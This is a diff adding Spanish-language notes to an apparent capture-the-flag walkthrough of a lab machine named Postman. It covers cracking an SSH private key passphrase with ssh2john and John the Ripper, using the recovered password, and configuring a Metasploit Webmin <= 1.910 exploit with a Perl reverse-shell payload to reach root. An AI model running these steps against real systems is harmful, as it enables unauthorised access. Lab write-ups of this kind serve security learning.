@@ -116,6 +116,87 @@ chmod 700 id_rsa_hash
 
 /usr/sbin/john --wordlist=/share/john/wordlists/rockyou.txt.gz id_rsa_hash
 
+Probamos con llave base64> 
+
+echo -n "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLR....... " | base64 -d > user.key
+
+/opt/JohnTheRipper/run/ssh2john.py user.key
+ 
+ /opt/JohnTheRipper/run/ssh2john.py user.KEy > user.hash
+ 
+  john --wordlist=rockyou.txt user.hash
+  
+  Matt password> computer2008
+  
+ejecutamos nuevamente la conexion con redis SSH con los mismos pasos para limpiar llave y agregar las nuestras
+
+una vez en redis nos pasamos a Matt
+
+su Matt
+
+password> computer2008
+
+locate user.txt
+
+cat /home/Matt/user.txt
+
+flag #1 > ........8a2f3c
 
 
+corremos nuevamente LinEnum
+
+no encontre nada interesante. 
+
+conectamos via web> 10.10.10.160
+
+https://10.10.10.160:10000
+
+postman credenciales>
+
+user: Matt
+password: computer2008
+
+agregar al archivo hosts el acceso a postman 
+
+echo "10.10.10.160" Postman >> /etc/hosts;
+
+En el sitio web vemos que la version de webadmin es 1.910
+
+searchsploit webadmin
+
+msfconsole 
+
+use exploit 
+
+PASSWORD   computer2008     yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME   Matt             yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.165     yes       The listen address (an interface may be specified)
+   LPORT  9004             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin <= 1.910
+
+pwd
+whoami
+ls -l
+shell
+cat /root/root.txt
+
+Flag #2 > .......86ddce
 
